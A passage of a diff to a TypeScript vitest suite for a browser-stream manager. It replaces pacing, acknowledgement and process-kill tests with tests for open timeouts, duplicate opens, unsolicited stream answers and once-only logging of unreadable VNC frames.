+    expect(port.streamTransportError).not.toHaveBeenCalled()
+    expect(port.streamClosed).not.toHaveBeenCalled()
+  })
+
+  it('a refused send with the agent browser off still says the bytes did not go', () => {
+    const { streams, port, opened, off, failBinary } = setup()
+    opened('local:w')
+    off()
+    failBinary()
+    expect(streams.bytes(screenFrame(STREAM, 0, new Uint8Array(1)))).toBe(false)
+    expect(port.streamRefused).not.toHaveBeenCalled()
+  })
+})
+
+describe('the core\'s own bounds on a browser stream', () => {
+  afterEach(() => { vi.useRealTimers() })
+
+  // Standard 6: every wait has a timeout. A service that took an open and never answered (its exec failed in a way it
+  // did not name) left the panel waiting for good, and after eight the connection was refused every open.
+  it('refuses an open the service has not answered in BROWSER_OPEN_WAIT_MS, says so, and ends the stream a late answer names', () => {
     vi.useFakeTimers()
-    const h = harness({ pauseBytes: 8192 * KiB, resumeBytes: 4096 * KiB })
-    const relay = h.open('mac-2')
-    const turn = h.open('mac-3')
-    const direct = h.open('mac-4')
-    h.manager.route(relay, 'relay')
-    h.manager.route(turn, 'turn')
-    h.manager.route(direct, 'direct')
-    for (const child of h.children) child.stdout.emit('data', bytes(2048 * KiB))
-    expect(h.sentBytes(direct)).toBe(2048 * KiB)
-    await vi.advanceTimersByTimeAsync(2_000)
-    const paced = h.sentBytes(relay) + h.sentBytes(turn)
-    expect(paced).toBeLessThanOrEqual(2 * 512 * KiB)
-    expect(paced).toBeGreaterThanOrEqual(2 * 512 * KiB - 2 * 32 * KiB)
-    expect(Math.abs(h.sentBytes(relay) - h.sentBytes(turn))).toBeLessThanOrEqual(32 * KiB)
+    const { streams, port, frames, log } = setup()
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    vi.advanceTimersByTime(BROWSER_OPEN_WAIT_MS - 1)
+    expect(frames).toEqual([])
+    vi.advanceTimersByTime(1)
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-1', error: 'NOT_READY' } }])
+    expect(log).toHaveBeenCalledOnce()
+    expect(log.mock.calls[0]![0]).toContain('did not answer')
+    // Its answer after all is a stream started for nobody: the service ends it.
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-1', streamId: STREAM })).toBe(false)
+    expect(port.streamRefused).toHaveBeenCalledExactlyOnceWith(STREAM)
+    expect(frames).toHaveLength(1)
+    // One answered in time is never given up.
+    streams.open('local:w', { requestId: 'r-2', agentId: 'a1' })
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-2', streamId: OTHER })).toBe(true)
+    vi.advanceTimersByTime(2 * BROWSER_OPEN_WAIT_MS)
+    expect(frames).toHaveLength(2)
   })
 
-  it('credit pauses the child\'s stdout at pauseBytes unacked and resumes below resumeBytes', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    const stdout = h.children[0].stdout
-    stdout.emit('data', bytes(200 * KiB))
-    expect(stdout.isPaused()).toBe(false)
-    stdout.emit('data', bytes(56 * KiB))
-    expect(stdout.isPaused()).toBe(true)
-    h.manager.ack('local:w', { streamId, bytes: 100 * KiB })
-    expect(stdout.isPaused()).toBe(true)
-    // Another connection's ack is not this viewer's.
-    h.manager.ack('mac-2', { streamId, bytes: 100 * KiB })
-    expect(stdout.isPaused()).toBe(true)
-    h.manager.ack('local:w', { streamId, bytes: 30 * KiB })
-    expect(stdout.isPaused()).toBe(false)
-  })
-
-  it('a send that returns false closes the stream with reason backlog', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    h.failBinary()
-    h.children[0].stdout.emit('data', bytes(64 * KiB))
-    expect(h.binary).toHaveLength(1)
-    expect(h.closes()).toEqual([['local:w', streamId, 'backlog']])
-    expect(h.children[0].kill).toHaveBeenCalled()
-  })
-
-  // Review finding: the daemon paced plaintext at the whole budget, the backend counts sealed bytes per fixed minute,
-  // and two viewers scrolling for a minute went over it, closing every relayed stream with `rate`.
-  it('two relayed streams at full speed stay under the backend\'s count of sealed bytes, minute after minute', async () => {
+  it('gives up no open whose connection ended, or that went with the service', () => {
     vi.useFakeTimers()
-    // The backend's rule (backend lib/terminalRelay.ts, adapterWs.ts): a kind-8 frame's sealed length, into a bucket
-    // that starts at its first frame and lasts a fixed minute, refused past 512 KiB × 60.
-    const BUDGET = 512 * KiB * 60
-    const windows: number[] = []
-    let startedAt = Number.NEGATIVE_INFINITY
-    let refused = 0
-    const closed: string[] = []
-    const key = new Uint8Array(32).fill(9)
-    let counter = 0
-    // A frame's sealed length is the sealer's, taken once for each shape a frame comes in: sealing every one of three
-    // minutes of frames for real took 0.9 s of CPU alone and past 30 s on a loaded gate.
-    const lengths = new Map<string, number>()
-    const sealedLength = (frame: TerminalBinaryClear): number => {
-      // Every frame must still be one the sealer takes (its stream id, seq and flags); only the AEAD is skipped.
-      if (!encodeTerminalPlain(frame)) throw new Error(`frame ${frame.seq} cannot be sealed`)
-      const shape = `${frame.kind}:${frame.bytes.length}:${frame.compressed ? 1 : 0}:${frame.tabId ?? ''}`
-      let length = lengths.get(shape)
-      if (length === undefined) lengths.set(shape, length = sealTerminalBinary(key, counter++, frame)!.length)
-      return length
-    }
-    const children: FakeChild[] = []
-    const manager = new BrowserStreamManager({
-      command: () => ({ argv: ARGV }),
-      asker: (connId) => ASKERS[connId],
-      sendTarget: (connId, type, payload) => {
-        // Each viewer answers the server's banner, as noVNC does.
-        if (type === 'agent_browser_open_result') queueMicrotask(() => manager.input(connId, payload.streamId as string, new TextEncoder().encode('RFB 003.008\n')))
-        if (type === 'agent_browser_close') closed.push(payload.reason as string)
-        return true
-      },
-      sendBinaryTarget: (_connId, frame) => {
-        const sealed = sealedLength(frame)
-        if (Date.now() - startedAt >= 60_000) { startedAt = Date.now(); windows.push(0) }
-        if (windows[windows.length - 1] + sealed > BUDGET) refused++
-        else windows[windows.length - 1] += sealed
-        return true
-      },
-      measure: () => {},
-      pacing: { bytesPerSecond: BROWSER_PACING_BYTES_PER_SECOND },
-      // The viewers draw at once: only the pace holds the bytes back.
-      window: { pauseBytes: 1024 * 1024 * KiB, resumeBytes: 512 * 1024 * KiB },
-      chunkBytes: BROWSER_CHUNK_BYTES,
+    const { streams, frames } = setup()
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    streams.closeConnection('local:w')
+    streams.open('mac-2', { requestId: 'r-2', agentId: 'a1' })
+    streams.gone()
+    expect(frames).toEqual([{ connId: 'mac-2', type: 'agent_browser_open_result', payload: { requestId: 'r-2', error: 'NOT_READY' } }])
+    vi.advanceTimersByTime(2 * BROWSER_OPEN_WAIT_MS)
+    expect(frames).toHaveLength(1)
+  })
+
+  // In the core's process the service answers in the same call, and a port that then fails is the host's fallback.
+  it('answers an open once when the service answered it and then failed', () => {
+    const { streams, port, frames } = setup()
+    port.stream.mockImplementationOnce((connId, _type, payload) => {
+      streams.frame(connId, 'agent_browser_open_result', { requestId: payload.requestId, error: 'NO_BROWSER' })
+      return false
     })
-    spawn.mockReset().mockImplementation(() => { const child = fakeChild(); children.push(child); return child })
-    // Neither route is known yet: both are paced as relayed.
-    for (const connId of ['mac-2', 'mac-3']) manager.open(connId, { requestId: `r-${connId}`, agentId: 'a1' })
-    // Idle first, so the pace's bucket is full when the scrolling starts.
-    await vi.advanceTimersByTimeAsync(5_000)
-    const screen = bytes(64 * KiB)
-    // Each stream offers more than the whole budget: 640 KiB a second.
-    const feed = setInterval(() => { for (const child of children) child.stdout.emit('data', screen) }, 100)
-    await vi.advanceTimersByTimeAsync(3 * 60_000)
-    clearInterval(feed)
-    expect(refused).toBe(0)
-    expect(closed).toEqual([])
-    expect(windows).toHaveLength(3)
-    // And the pace is not so careful that it wastes the budget.
-    for (const used of windows) expect(used).toBeGreaterThan(0.85 * BUDGET)
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-1', error: 'NO_BROWSER' } }])
   })
 
-  it('a stream whose credit stays used up for 10 s is closed with reason backlog', async () => {
-    vi.useFakeTimers()
-    const h = harness()
-    const streamId = h.open('local:w')
-    h.manager.input('local:w', streamId, new TextEncoder().encode('RFB 003.008\n'))
-    h.children[0].stdout.emit('data', bytes(256 * KiB))
-    await vi.advanceTimersByTimeAsync(9_999)
-    expect(h.closes()).toEqual([])
-    await vi.advanceTimersByTimeAsync(1)
-    expect(h.closes()).toEqual([['local:w', streamId, 'backlog']])
+  it('passes an open asked again while it is unanswered on once: one answer, one exec', () => {
+    const { streams, port } = setup()
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    expect(port.stream).toHaveBeenCalledOnce()
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-1', streamId: STREAM })).toBe(true)
+    // Answered, it is a new open.
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    expect(port.stream).toHaveBeenCalledTimes(2)
   })
 
-  // Review finding: a Desktop that gave up on its open (or closed its panel first) never answers, and its stream held one
-  // of the browser's four viewer slots until it reconnected.
-  it('a viewer that never answers the banner is closed with reason backlog 10 s after it was sent, and logged once', async () => {
-    vi.useFakeTimers()
+  it('tells the service to end a stream an answer named that nobody asked for, and only a stream', () => {
+    const { streams, port } = setup()
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-9', streamId: STREAM })).toBe(false)
+    expect(streams.frame('local:w', 'agent_browser_open_result', { streamId: OTHER })).toBe(false)
+    for (const streamId of ['stream-1', 7, undefined, '']) expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-9', streamId })).toBe(false)
+    expect(port.streamRefused.mock.calls).toEqual([[STREAM], [OTHER]])
+  })
+
+  it('ends a stream whose viewer\'s bytes did not reach the service: VNC would read the rest of it wrong', () => {
+    const { streams, port, frames, opened } = setup()
+    opened('local:w')
+    port.streamInput.mockReturnValueOnce(false)
+    streams.input('local:w', STREAM, Uint8Array.of(4, 1))
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_close', payload: { streamId: STREAM, reason: 'agent' } }])
+    expect(port.streamRefused).toHaveBeenCalledExactlyOnceWith(STREAM)
+    streams.input('local:w', STREAM, Uint8Array.of(4, 1))
+    expect(port.streamInput).toHaveBeenCalledOnce()
+  })
+
+  // Standard 6: nothing fails without a word. A frame the core cannot read is a service that frames them wrong (one of
+  // another version, say): said once, not once a frame, and again after the service connects again.
+  it('says a screen frame it cannot read once each time the agent browser connects', () => {
+    const { streams, log } = setup()
+    expect(streams.bytes(Uint8Array.of(1, 2, 3))).toBe(false)
+    expect(streams.bytes(new Uint8Array(64))).toBe(false)
+    expect(log).toHaveBeenCalledOnce()
+    expect(log.mock.calls[0]![0]).toContain('cannot read (3 bytes)')
+    // A frame for a stream nobody holds is the tail of one that ended: no word.
+    expect(streams.bytes(screenFrame(STREAM, 0, Uint8Array.of(1)))).toBe(false)
+    expect(log).toHaveBeenCalledOnce()
+    streams.gone()
+    expect(streams.bytes(Uint8Array.of(1))).toBe(false)
+    expect(log).toHaveBeenCalledTimes(2)
+  })
+
+  it('logs to the console when it is given no log', () => {
     const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
-    const h = harness()
-    const silent = h.open('mac-2')
-    const answered = h.open('mac-3')
-    h.manager.route(silent, 'relay')
-    h.manager.route(answered, 'relay')
-    // The exec takes a while to start: the viewer is not owed a word before its banner left.
-    await vi.advanceTimersByTimeAsync(5_000)
-    const banner = new TextEncoder().encode('RFB 003.008\n')
-    for (const child of h.children) child.stdout.emit('data', Buffer.from(banner))
-    h.manager.input('mac-3', answered, banner)
-    await vi.advanceTimersByTimeAsync(9_999)
-    expect(h.closes()).toEqual([])
-    await vi.advanceTimersByTimeAsync(1)
-    expect(h.closes()).toEqual([['mac-2', silent, 'backlog']])
-    expect(warn.mock.calls.filter(call => call.join(' ').includes(`${silent.slice(0, 8)}`))).toHaveLength(1)
-    expect(warn.mock.calls.flat().join(' ')).toContain('never answered')
-    // Its slot is free again; the viewer that answered keeps its stream however long its screen stays still.
-    await vi.advanceTimersByTimeAsync(10 * 60_000)
-    expect(h.closes()).toEqual([['mac-2', silent, 'backlog']])
-  })
-
-  it('an ack is an answer too', async () => {
-    vi.useFakeTimers()
-    const h = harness()
-    const streamId = h.open('local:w')
-    h.children[0].stdout.emit('data', bytes(64 * KiB))
-    h.manager.ack('local:w', { streamId, bytes: 64 * KiB })
-    await vi.advanceTimersByTimeAsync(60_000)
-    expect(h.closes()).toEqual([])
-  })
-
-  it('bytes still waiting for their pace do not count as a lost ack', async () => {
-    vi.useFakeTimers()
-    const h = harness()
-    const streamId = h.open('mac-2')
-    h.manager.input('mac-2', streamId, new TextEncoder().encode('RFB 003.008\n'))
-    h.manager.route(streamId, 'relay')
-    h.children[0].stdout.emit('data', bytes(256 * KiB))
-    // A whole window at the relay's pace takes half a second to leave, after which the ack has 10 s.
-    await vi.advanceTimersByTimeAsync(10_200)
-    expect(h.closes()).toEqual([])
-    await vi.advanceTimersByTimeAsync(500)
-    expect(h.closes()).toEqual([['mac-2', streamId, 'backlog']])
+    try {
+      const streams = createBrowserStreams({ port: () => null, asker: () => ({ local: true, owner: true }), send: () => true, sendBinary: () => true })
+      streams.bytes(Uint8Array.of(1))
+      expect(warn).toHaveBeenCalledOnce()
+    } finally {
+      warn.mockRestore()
+    }
   })
 })
 
-describe('what a browser stream ignores and how it fails', () => {
-  it('an open without a request id is not answered, and one without an agent has no browser', () => {
-    const h = harness()
-    h.manager.open('local:w', { agentId: 'a1' })
-    h.manager.open('local:w', { requestId: 'r-x' })
-    expect(h.frames).toEqual([{ connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-x', error: 'NO_BROWSER' } }])
-    expect(h.spawn).not.toHaveBeenCalled()
-  })
-
-  it('an ack that is not a positive count changes nothing, and an ack past what was sent leaves no credit owed', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    const stdout = h.children[0].stdout
-    stdout.emit('data', bytes(256 * KiB))
-    for (const value of [0, -5, Number.NaN, '64']) h.manager.ack('local:w', { streamId, bytes: value })
-    expect(stdout.isPaused()).toBe(true)
-    h.manager.ack('local:w', { streamId, bytes: 1024 * KiB })
-    expect(stdout.isPaused()).toBe(false)
-    stdout.emit('data', bytes(255 * KiB))
-    expect(stdout.isPaused()).toBe(false)
-  })
-
-  it('a viewer message the shaper cannot read closes the stream with reason closed and a line naming it', () => {
-    const h = harness()
-    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
-    const streamId = h.open('local:w')
-    h.manager.input('local:w', streamId, new TextEncoder().encode('RFB 003.008\n'))
-    h.manager.input('local:w', streamId, Uint8Array.of(1, 1, 99))
-    expect(h.closes()).toEqual([['local:w', streamId, 'closed']])
-    expect(warn.mock.calls.flat().join(' ')).toContain('unknown RFB client message type 99')
-  })
-
-  it('an exec that exits says why in the log', () => {
-    const h = harness()
-    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
-    h.open('local:w')
-    h.children[0].stderr.emit('data', Buffer.from('Error: no container with name or ID "harness-browser-a1" found\n'))
-    h.children[0].exit(125, null)
-    expect(warn.mock.calls.flat().join(' ')).toContain('exec exited (125): Error: no container with name or ID "harness-browser-a1" found')
-    // An exec ended by a signal (the OOM killer's) names it.
-    h.open('local:w')
-    h.children[1].exit(null, 'SIGKILL')
-    expect(warn.mock.calls.flat().join(' ')).toContain('exec exited (SIGKILL)')
-  })
-
-  it('an ack or a close that names no stream changes nothing', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    h.children[0].stdout.emit('data', bytes(256 * KiB))
-    h.manager.ack('local:w', { bytes: 256 * KiB })
-    h.manager.close('local:w', { streamId: 7 })
-    expect(h.children[0].stdout.isPaused()).toBe(true)
-    expect(h.closes()).toEqual([])
-    expect(streamId).toBeTruthy()
-  })
-
-  it('an exec that fails after its stream closed closes it once', () => {
-    const h = harness()
-    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
-    const streamId = h.open('local:w')
-    h.manager.close('local:w', { streamId })
-    h.children[0].emit('error', new Error('kill EPERM'))
-    expect(h.closes()).toEqual([['local:w', streamId, 'closed']])
-    expect(warn.mock.calls.flat().join(' ')).toContain('exec failed: kill EPERM')
-  })
-
-  it('a child that dies under a write to its stdin ends the stream only by its exit', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    h.children[0].stdin.emit('error', new Error('write EPIPE'))
-    expect(h.closes()).toEqual([])
-    h.children[0].exit(1, null)
-    expect(h.closes()).toEqual([['local:w', streamId, 'agent']])
-  })
-
-  it('a frame request held for its pace is dropped when the stream closes', async () => {
-    vi.useFakeTimers()
-    const h = harness()
-    const streamId = h.open('local:w')
-    h.manager.input('local:w', streamId, new TextEncoder().encode('RFB 003.008\n'))
-    h.manager.input('local:w', streamId, Uint8Array.of(1, 1))
-    const update = Uint8Array.of(3, 1, 0, 0, 0, 0, 0, 1, 0, 1)
-    h.manager.input('local:w', streamId, update)
-    // The second inside one frame of the first is held for the direct profile's 15 fps.
-    h.manager.input('local:w', streamId, update)
-    const write = vi.spyOn(h.children[0].stdin, 'write')
-    h.manager.close('local:w', { streamId })
-    await vi.advanceTimersByTimeAsync(1_000)
-    // Its stdin is ended: a write would be a write after end.
-    expect(write).not.toHaveBeenCalled()
-  })
-
-  it('a route or a lost route for no stream, and a route for a local stream, change nothing', () => {
-    const h = harness()
-    const local = h.open('local:w')
-    h.manager.route('gone', 'relay')
-    h.manager.routeLost('gone')
-    h.manager.route(local, 'relay')
-    h.children[0].stdout.emit('data', bytes(KiB))
-    expect(h.sentBytes(local)).toBe(KiB)
-    expect(h.closes()).toEqual([])
-  })
-
-  it('bytes waiting for their pace leave at once when the route turns out direct', () => {
-    vi.useFakeTimers()
-    const h = harness()
-    const streamId = h.open('mac-2')
-    h.children[0].stdout.emit('data', bytes(128 * KiB))
-    expect(h.sentBytes(streamId)).toBe(0)
-    h.manager.route(streamId, 'direct')
-    expect(h.sentBytes(streamId)).toBe(128 * KiB)
-  })
-
-  it('a refused send while paced or while flushing closes the stream with reason backlog', async () => {
-    vi.useFakeTimers()
-    const h = harness()
-    const paced = h.open('mac-2')
-    const flushed = h.open('mac-3')
-    h.children[0].stdout.emit('data', bytes(64 * KiB))
-    h.children[1].stdout.emit('data', bytes(64 * KiB))
-    h.failBinary()
-    h.manager.route(flushed, 'direct')
-    await vi.advanceTimersByTimeAsync(1_000)
-    expect(h.closes()).toEqual([['mac-3', flushed, 'backlog'], ['mac-2', paced, 'backlog']])
-  })
-
-  it('a refused send of bytes the pace lets through at once closes the stream with reason backlog', async () => {
-    vi.useFakeTimers()
-    const h = harness()
-    const streamId = h.open('mac-2')
-    // A full bucket: the first chunk leaves as it is read.
-    await vi.advanceTimersByTimeAsync(1_000)
-    h.failBinary()
-    h.children[0].stdout.emit('data', bytes(256 * KiB))
-    expect(h.binary).toHaveLength(1)
-    expect(h.closes()).toEqual([['mac-2', streamId, 'backlog']])
-    await vi.advanceTimersByTimeAsync(20_000)
-    expect(h.closes()).toEqual([['mac-2', streamId, 'backlog']])
-  })
-})
-
-describe('closing a browser stream', () => {
-  it('closeConnection kills every exec of that connection within one second', async () => {
-    vi.useFakeTimers()
-    const h = harness({ ignoresTerm: true })
-    h.open('mac-2')
-    h.open('mac-2')
-    h.open('mac-3')
-    h.manager.closeConnection('mac-2')
-    expect(h.children[0].kill).toHaveBeenCalledWith('SIGTERM')
-    expect(h.children[1].kill).toHaveBeenCalledWith('SIGTERM')
-    await vi.advanceTimersByTimeAsync(1_000)
-    expect(h.children[0].kill).toHaveBeenLastCalledWith('SIGKILL')
-    expect(h.children[1].kill).toHaveBeenLastCalledWith('SIGKILL')
-    expect(h.children[2].kill).not.toHaveBeenCalled()
-  })
-
-  it('closeAgent sends agent_browser_close with reason agent and kills the children', () => {
-    const h = harness()
-    const first = h.open('local:w')
-    const second = h.open('mac-2')
-    const other = h.open('mac-3', 'a2')
-    h.manager.closeAgent('a1')
-    expect(h.closes()).toEqual([['local:w', first, 'agent'], ['mac-2', second, 'agent']])
-    expect(h.children[0].kill).toHaveBeenCalled()
-    expect(h.children[1].kill).toHaveBeenCalled()
-    expect(h.children[2].kill).not.toHaveBeenCalled()
-    expect(other).toBeTruthy()
-  })
-
-  it('child exit, agent stop and agent delete close with reason agent; a client\'s close closes with reason closed', () => {
-    const h = harness()
-    const exited = h.open('local:w')
-    const stopped = h.open('mac-2', 'a2')
-    const closed = h.open('mac-3')
-    h.children[0].exit(1, null)
-    h.manager.closeAgent('a2')
-    h.manager.close('mac-2', { streamId: closed }) // not that connection's stream
-    h.manager.close('mac-3', { streamId: closed })
-    expect(h.closes()).toEqual([['local:w', exited, 'agent'], ['mac-2', stopped, 'agent'], ['mac-3', closed, 'closed']])
-    // An exec that already exited is not killed.
-    expect(h.children[0].kill).not.toHaveBeenCalled()
-  })
-
-  it('child exit sends agent_browser_close', () => {
-    const h = harness()
-    const streamId = h.open('mac-2')
-    h.children[0].emit('error', new Error('spawn podman ENOENT'))
-    h.children[0].emit('exit', null, null)
-    expect(h.closes()).toEqual([['mac-2', streamId, 'agent']])
-  })
-
-  it('a stream whose direct link drops is closed with reason route, and is never moved to the relay', () => {
-    const h = harness()
-    const streamId = h.open('mac-2')
-    h.manager.route(streamId, 'direct')
-    h.manager.routeLost(streamId)
-    h.children[0].stdout.emit('data', bytes(KiB))
-    expect(h.closes()).toEqual([['mac-2', streamId, 'route']])
-    expect(h.binary).toEqual([])
-  })
-
-  // Review Focus 5: a refused relay frame cannot name its stream, so every relayed one closes.
-  it('a transport error closes every relayed browser stream with reason rate', () => {
-    const h = harness()
-    const relay = h.open('mac-2')
-    const turn = h.open('mac-3')
-    const direct = h.open('mac-4')
-    const local = h.open('local:w')
-    const unrouted = h.open('mac-2', 'a2')
-    h.manager.route(relay, 'relay')
-    h.manager.route(turn, 'turn')
-    h.manager.route(direct, 'direct')
-    h.manager.transportError()
-    expect(h.closes()).toEqual([['mac-2', relay, 'rate'], ['mac-2', unrouted, 'rate']])
-    expect(local && turn && direct).toBeTruthy()
-  })
-})
